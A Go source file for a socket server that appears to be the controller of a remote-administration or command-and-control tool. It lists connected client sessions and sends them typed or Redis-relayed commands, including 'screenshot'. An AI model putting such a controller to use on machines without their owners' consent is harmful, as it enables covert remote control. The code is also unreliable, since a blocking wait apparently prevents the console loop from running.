package main

import (
    "bufio"
    "flag"
    "fmt"
    "log"
    "net"
    "os"
    "strconv"
    "sync"
    "encoding/json"
    "github.com/mxi4oyu/MoonSocket/protocol"
    "github.com/gomodule/redigo/redis"
)

const (
    WHITE   = "\x1b[37;1m"
    RED     = "\x1b[31;1m"
    GREEN   = "\x1b[32;1m"
    YELLOW  = "\x1b[33;1m"
    BLUE    = "\x1b[34;1m"
    MAGENTA = "\x1b[35;1m"
    CYAN    = "\x1b[36;1m"
    VERSION = "2.5.0"
)

var (
    inputIP         = flag.String("IP", "0.0.0.0", "Listen IP")
    inputPort       = flag.String("PORT", "8848", "Listen Port")
    counter         int                                       //用于会话计数，给map的key使用
    connlist        map[int]net.Conn = make(map[int]net.Conn) //存储所有连接的会话
    connlistIPAddr  map[int]string   = make(map[int]string)   //存储所有IP地址，提供输入标识符显示
    lock                             = &sync.Mutex{}
    cmdinfo = make(map[string]string)
)

// ReadLine 函数等待命令行输入,返回字符串
func ReadLine() string {
    buf := bufio.NewReader(os.Stdin)
    lin, _, err := buf.ReadLine()
    if err != nil {
        fmt.Println(RED, "[!] Error to Read Line!")
    }
    return string(lin)
}

// Socket客户端连接处理程序,专用于接收消息处理
func connection(conn net.Conn) {
    defer conn.Close()
    var myid int
    myip := conn.RemoteAddr().String()
    lock.Lock()
    counter++
    myid = counter
    connlist[counter] = conn
    connlistIPAddr[counter] = myip
    lock.Unlock()

    fmt.Printf("--- 客户端: %s 连接成功 ---\n", myip)
    tmpbuf:=make([] byte,0)
    buf:=make([] byte,1024)
    for {
        n,err:=conn.Read(buf)
        //如果客户端断开
        if err!=nil {
            conn.Close()
            delete(connlist, myid)
            delete(connlistIPAddr, myid)
            fmt.Printf("--- 客户端：%s 关闭 ---\n", myip)
            return
        }
        tmpbuf = protocol.Depack(append(tmpbuf,buf[:n]...))
        handClientMsg(string(tmpbuf))
        //fmt.Printf("客户端%s发来消息:%s \n",conn.RemoteAddr().String(),string(tmpbuf))
    }
}

func handClientMsg(msg string){
    if msg == "❤❤❤❤❤❤" {
        //fmt.Println("接收到心跳消息")
    }else {
        fmt.Printf("接收到客户端的信息：%s",msg)
    }
}

// 等待Socket 客户端连接
func handleConnWait() {
    l, err := net.Listen("tcp", *inputIP+":"+*inputPort)
    if err != nil {
        log.Fatal(err)
    }
    defer l.Close()
    for {
        conn, err := l.Accept()
        if err != nil {
            log.Fatal(err)
        }
        go connection(conn)

    }
}

// redis初始化连接
func newRedisclient() (conn redis.Conn, err error) {
    host := "127.0.0.1"
    port := "6379"
    adderss := host + ":" + port
    c, err := redis.Dial("tcp", adderss)
    return c, err
}

//订阅redis
func resolveOrderCreate(wait *sync.WaitGroup)  {
    defer wait.Done()
    conn, err := newRedisclient()
    if err != nil {
        return
    }
    client := redis.PubSubConn{conn}
    err = client.Subscribe("order-create")
    if err != nil {
        fmt.Println("订阅错误:", err)
        return
    }
    fmt.Println("等待订阅数据 ---->")
    for {
        switch v := client.Receive().(type){
        case redis.Message:
            //fmt.Printf("收到来自%s订阅消息:%s", v.Channel, string(v.Data))
            handleRedisMsg(string(v.Data))
        case redis.Subscription:
            fmt.Println("Subscription", v.Channel, v.Kind, v.Count)
        }
    }
}

func handleRedisMsg(info string){
    err:= json.Unmarshal([]byte(info), &cmdinfo)
    if err != nil {
        fmt.Println("string转map失败",err)
    }else {
        fmt.Println(cmdinfo)
        for key,value := range cmdinfo{
            connid,_ := strconv.Atoi(key)
            if value != "" {
                var e error
                if e != nil {
                } else if _, ok := connlist[connid]; ok {
                    sendMsgToClient(connlist[connid],value)
                }
            }

        }
    }

}

func main() {
    flag.Parse()
    go handleConnWait()
    var wg sync.WaitGroup
    wg.Add(1)
    go resolveOrderCreate(&wg)
    wg.Wait()
    connid := 0
    for {
        fmt.Print(RED, "SESSION ", connlistIPAddr[connid], WHITE, "> ")
        command := ReadLine()
        _conn, ok := connlist[connid]
        switch command {
        case "":
            // 如果输入为空，则什么都不做
        case "help":
            fmt.Println("")
            fmt.Println(CYAN, "-------------------------------------------------------")
            fmt.Println(CYAN, "session             选择在线的客户端")
            fmt.Println(CYAN, "exit                客户端下线")
            fmt.Println(CYAN, "quit                退出服务器端")
            fmt.Println(CYAN, "-------------------------------------------------------")
            fmt.Println("")
        case "session":
            fmt.Println(connlist)
            fmt.Print("选择客户端ID: ")
            inputid := ReadLine()
            if inputid != "" {
                var e error
                connid, e = strconv.Atoi(inputid)
                if e != nil {
                    fmt.Println("请输入数字")
                } else if _, ok := connlist[connid]; ok {
                    //如果输入并且存在客户端id
                    //_cmd := base64.URLEncoding.EncodeToString([]byte("getos"))
                    sendMsgToClient(connlist[connid],"cmd")
                }
            }
        case "exit":
            if ok {
                sendMsgToClient(_conn,"exit")
            }
        case "quit":
            os.Exit(0)

        case "screenshot":
            if ok {
                sendMsgToClient(_conn,"screenshot")
            }
        default:
            if ok {
                sendMsgToClient(_conn,command)
            }
        }
    }
}

func sendMsgToClient(conn net.Conn,msg string)  {
    //将信息封包
    smsg:=protocol.Enpack([]byte(msg))
    conn.Write(smsg)
}
